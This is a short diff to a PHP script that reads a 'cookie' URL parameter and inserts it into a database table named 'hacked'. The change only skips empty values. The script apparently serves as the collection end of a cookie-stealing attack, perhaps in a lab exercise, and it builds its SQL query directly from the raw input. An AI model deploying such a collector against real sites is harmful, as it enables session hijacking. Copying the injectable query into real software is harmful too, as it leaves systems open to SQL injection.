@@ -2,8 +2,10 @@
 if (isset($_GET["cookie"])){
 	include "../credentials.php";
 	$cookie = $_GET["cookie"] ?? '';
-	$sql = "INSERT into hacked values ('$cookie');";
-	mysqli_query($conn,$sql);
+	if ($cookie != ""){
+		$sql = "INSERT into hacked values ('$cookie');";
+		mysqli_query($conn,$sql);
+	}
 }
 ?>
 <html>
